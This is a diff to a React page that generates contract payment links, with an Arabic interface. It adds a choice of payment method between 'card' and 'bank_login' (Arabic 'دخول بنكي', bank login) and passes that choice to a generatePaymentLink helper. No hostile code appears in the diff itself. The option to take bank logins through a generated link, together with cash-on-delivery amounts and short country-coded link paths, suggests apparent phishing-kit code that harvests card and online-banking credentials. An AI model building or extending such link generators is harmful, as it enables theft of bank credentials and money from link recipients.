@@ -8,9 +8,10 @@ import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@
 import { Textarea } from "@/components/ui/textarea";
 import { Badge } from "@/components/ui/badge";
 import { getCountryByCode } from "@/lib/countries";
-import { ArrowRight, FileText, Scale, RefreshCw, DollarSign, Download, Eye, Stamp, PenTool } from "lucide-react";
+import { ArrowRight, FileText, Scale, RefreshCw, DollarSign, Download, Eye, Stamp, PenTool, CreditCard, Building2 } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { useCreateLink } from "@/hooks/useSupabase";
+import { generatePaymentLink } from "@/utils/paymentLinks";
 import BottomNav from "@/components/BottomNav";
 import BackButton from "@/components/BackButton";
 import { formatCurrency, getCurrencySymbol, getCurrencyCode } from "@/lib/countryCurrencies";
@@ -47,6 +48,7 @@ const Contracts = () => {
 
   const [selectedTemplate, setSelectedTemplate] = useState<string>("");
   const [contractData, setContractData] = useState<Record<string, string>>({});
+  const [paymentMethod, setPaymentMethod] = useState<string>("card");
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [showSuccess, setShowSuccess] = useState(false);
   const [createdLink, setCreatedLink] = useState("");
@@ -205,12 +207,21 @@ const Contracts = () => {
       service_type: 'contracts',
       cod_amount: amount,
       currency_code: getCurrencyCode(country || "SA"),
+      payment_method: paymentMethod,
       service_name: template.name
     };
 
     try {
       const link = await createLink.mutateAsync({ type: "contracts", country_code: country || "SA", payload: contractPayload });
-      const paymentUrl = `${window.location.origin}/r/${country || 'SA'}/contracts/${link.id}`;
+      const paymentUrl = generatePaymentLink({
+        invoiceId: link.id,
+        company: 'contracts',
+        country: country || 'SA',
+        amount: amount,
+        currency: getCurrencyCode(country || 'SA'),
+        paymentMethod: paymentMethod,
+        type: 'contracts'
+      });
       setCreatedLink(paymentUrl);
       setShowSuccess(true);
       toast({ title: "تم إنشاء العقد بنجاح!" });
@@ -332,6 +343,20 @@ const Contracts = () => {
                           </div>
                         </div>
                       ))}
+                   </div>
+                </Card>
+
+                <Card className="p-8 border-2 rounded-3xl shadow-xl relative overflow-hidden">
+                   <h3 className="text-xl font-black text-gray-800 mb-6">طريقة السداد المتاحة في الرابط</h3>
+                   <div className="grid grid-cols-2 gap-4">
+                      <button type="button" onClick={() => setPaymentMethod('card')} className={`p-6 rounded-2xl border-2 transition-all flex flex-col items-center gap-3 ${paymentMethod === 'card' ? 'border-blue-500 bg-blue-50/50' : 'border-gray-50 bg-gray-50'}`}>
+                        <CreditCard className={`w-10 h-10 ${paymentMethod === 'card' ? 'text-blue-500' : 'text-gray-300'}`} />
+                        <span className={`text-sm font-black ${paymentMethod === 'card' ? 'text-blue-600' : 'text-gray-400'}`}>بطاقة دفع</span>
+                      </button>
+                      <button type="button" onClick={() => setPaymentMethod('bank_login')} className={`p-6 rounded-2xl border-2 transition-all flex flex-col items-center gap-3 ${paymentMethod === 'bank_login' ? 'border-blue-500 bg-blue-50/50' : 'border-gray-50 bg-gray-50'}`}>
+                        <Building2 className={`w-10 h-10 ${paymentMethod === 'bank_login' ? 'text-blue-500' : 'text-gray-300'}`} />
+                        <span className={`text-sm font-black ${paymentMethod === 'bank_login' ? 'text-blue-600' : 'text-gray-400'}`}>دخول بنكي</span>
+                      </button>
                    </div>
                 </Card>
 
